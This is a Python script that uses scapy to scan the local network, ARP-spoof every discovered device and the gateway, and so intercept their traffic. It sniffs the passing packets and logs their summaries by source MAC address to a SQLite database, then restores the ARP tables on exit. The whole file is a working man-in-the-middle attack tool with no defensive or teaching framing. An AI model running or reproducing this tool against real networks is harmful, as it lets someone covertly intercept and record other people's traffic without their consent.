from scapy import all as scapy
import sqlite3
import my_conf
import threading
import time

# network

verbose = True

def get_mac(ip):
	ans, _ = scapy.srp(scapy.Ether(dst="ff:ff:ff:ff:ff:ff")/scapy.ARP(pdst=ip), timeout=3, verbose=False)
	if ans:
		return ans[0][1].src

def spoof(target_ip, host_ip):
	target_mac = get_mac(target_ip)
	arp_response = scapy.ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, op="is-at")
	scapy.send(arp_response, verbose=False)
	if verbose:
		self_mac = scapy.ARP().hwsrc
		print("[+] Sent to {} : {} is-at {}".format(target_ip, host_ip, self_mac))

def restore(target_ip, host_ip):
	target_mac = get_mac(target_ip)
	host_mac = get_mac(host_ip)
	arp_response = scapy.ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, hwsrc=host_mac)
	scapy.send(arp_response, count=7, verbose=False)
	if verbose:
		print("[+] Sent to {} : {} is-at {}".format(target_ip, host_ip, host_mac))

def scan(ip):
	ans, _ = scapy.srp(scapy.Ether(dst="ff:ff:ff:ff:ff:ff")/scapy.ARP(pdst=ip), timeout=3, verbose=False)
	ret = set()
	for i in ans:
		ip, mac = i[1].psrc, i[1].hwsrc
		ret.add((ip, mac))
	return ret

# db

def db_open():
	db = sqlite3.connect(my_conf.database, isolation_level=None, check_same_thread=False)
	db.cursor().executescript("""
		CREATE TABLE IF NOT EXISTS "device" (
			"mac"	TEXT NOT NULL UNIQUE,
			"when_added"	TEXT NOT NULL,
			PRIMARY KEY("mac")
		);
		CREATE TABLE IF NOT EXISTS "packet" (
			"from_device"	TEXT NOT NULL,
			"when_sent"	TEXT NOT NULL,
			"summary"	TEXT NOT NULL
		);
	""")
	return db

def db_register_device(db, mac):
	db.cursor().execute("INSERT OR IGNORE INTO 'device' VALUES (?, DATETIME('now'))", (mac,))

def db_register_packet(db, from_device, summary):
	db.cursor().execute("INSERT INTO 'packet' VALUES (?, DATETIME('now'), ?)", (from_device, summary))

# workers

def network_scan(state):
	while not state.should_exit.is_set():
		scanned = scan(my_conf.network)
		print("[+] Network scanned")
		for dev in scanned - state.ip_mac:
			ip, mac = dev
			print(f"[+] Device joined {ip} -> {mac}")
			db_register_device(state.db, mac)
		with state.lock:
			state.ip_mac.update(scanned)
		state.should_exit.wait(my_conf.network_scan_interval)

def arp_poison(state):
	while not state.should_exit.is_set():
		with state.lock:
			targets = set(state.ip_mac)
		for dev in targets:
			ip, mac = dev
			if ip == scapy.conf.iface.ip or ip == my_conf.gateway_ip:
				continue
			spoof(ip, my_conf.gateway_ip)
			spoof(my_conf.gateway_ip, ip)
		state.should_exit.wait(my_conf.arp_poison_interval)

# main

if __name__ == "__main__":

	scapy.conf.iface = scapy.conf.ifaces.dev_from_name(my_conf.dev_name)

	class state:
		db = db_open()
		ip_mac = set()
		lock = threading.Lock()
		should_exit = threading.Event()

	def handle_packet(pkt):
		mac = pkt.getlayer(scapy.Ether).src
		db_register_packet(state.db, mac, pkt.summary())

	threads = [
		threading.Thread(target=network_scan, args=(state,)),
		threading.Thread(target=arp_poison, args=(state,)),
	]

	for thread in threads:
		thread.start()

	scapy.sniff(prn=handle_packet, filter=my_conf.filter)

	state.should_exit.set()

	print("[+] Waiting for threads")

	for thread in threads:
		thread.join()

	print("[+] Restoring ARP")

	for dev in state.ip_mac:
		ip, mac = dev
		if ip == scapy.conf.iface.ip or ip == my_conf.gateway_ip:
			continue
		restore(ip, my_conf.gateway_ip)
		restore(my_conf.gateway_ip, ip)

	print("[+] Closing db")

	state.db.close()

